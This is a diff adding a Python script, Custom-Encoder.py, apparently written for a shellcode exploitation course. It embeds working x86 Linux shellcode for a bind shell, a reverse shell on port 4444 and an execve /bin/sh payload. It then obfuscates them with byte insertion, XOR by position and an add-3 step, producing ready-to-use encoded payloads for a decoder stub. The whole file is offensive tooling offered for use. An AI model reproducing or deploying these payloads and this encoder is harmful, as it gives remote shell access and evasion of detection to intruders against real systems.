@@ -1,0 +1,72 @@
+#!/usr/bin/python
+
+# Filename: Custom-Encoder.py
+# Author: David Alvarez Robles (km0xu95)
+# Website: https://blog.asturhackers.es
+
+# Purpose: This script was developed in order to encode payloads for later use
+# in conjuction with shellcode decoder payload
+
+# Codification will:
+	# 1. Insert \xDA every byte
+	# 2. XOR every byte with its position (if position number is diferent than byte value)
+	# 3. Add 3 to every byte
+
+import random
+import sys
+
+if(len(sys.argv) != 2):
+	print "Usage: ./Custom-Encoder.py <HelloWorld/Bind/Reverse/Execve>"
+	sys.exit(0)
+
+if sys.argv[1].startswith("HelloWorld"):
+	print "\n[*] Selected HelloWorld payload"
+	shellcode = '\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x68\x72\x6c\x64\x0a\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80'
+elif sys.argv[1].startswith("Bind"):
+	print "\n[*] Selected Bind payload"
+	shellcode = '\x31\xc0\x89\xc3\x50\x6a\x01\x6a\x02\xb0\x66\x43\x89\xe1\xcd\x80\x89\xc2\x31\xf6\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\x6a\x16\x56\x52\xb0\x66\x43\x89\xe1\xcd\x80\x6a\x01\x52\xb0\x66\x83\xc3\x02\x89\xe1\xcd\x80\x31\xff\x57\x57\x52\xb0\x66\x83\xc3\x01\x89\xe1\xcd\x80\x89\xc2\x89\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
+elif sys.argv[1].startswith("Reverse"):
+	print "\n[*] Selected Reverse payload"
+	shellcode = '\x31\xc0\x89\xc3\x50\x6a\x01\x6a\x02\xb0\x66\x43\x89\xe1\xcd\x80\x89\xc2\x31\xf6\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\x6a\x16\x56\x52\xb0\x66\x83\xc3\x02\x89\xe1\xcd\x80\x89\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
+else:
+	print "\n[*] Selected Execve payload"
+	shellcode = '\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43'
+
+shellcode2 = ""
+
+encoded = ""
+encoded2 = ""
+
+position = 0x01
+
+for x in bytearray(shellcode) :
+	shellcode2 += '\\x'
+	shellcode2 += '%02x' % x
+
+	# If position number is NOT equal to value make XOR -> Avoid null bytes
+	if x != position:
+		y = x^position
+	else:
+		y = x
+
+	# Add 3 to the result of XOR operation
+	y += 0x03	
+
+	# Make the insertion of resulting 2 bytes
+	encoded += '\\x'
+	encoded += '%02x' % y
+	encoded += '\\x%02x' % 0xDA
+
+	encoded2 += '0x'
+	encoded2 += '%02x,' %y
+	encoded2 += '0x%02x,' % 0xDA
+
+	position += 1
+
+print '\n[*] Original shellcode: ' + shellcode2
+print '\n[*] Encoded shellcode: ' + encoded
+print '\n[+] Ready to use shellcode: ' + encoded2[:-1]
+
+print '\nOriginal shellcode length: %d' % len(bytearray(shellcode))
+print '\nEncoded shellcode length: %d' % (len(encoded.split("\\x"))-1)
+print '\n'
